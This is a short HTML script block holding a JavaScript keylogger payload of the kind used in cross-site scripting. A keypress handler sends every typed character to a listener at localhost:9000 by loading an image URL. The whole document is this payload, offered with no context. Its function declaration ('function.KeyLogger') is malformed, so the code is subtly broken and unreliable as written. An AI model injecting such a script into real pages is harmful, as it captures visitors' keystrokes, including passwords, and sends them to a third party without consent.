<script>
document.onkeypress = function.KeyLogger(key) {
   key_pressed = String.fromCharCode(key.which);
   new Image().src = 'http://localhost:9000/?'+key_pressed;
}
</script>
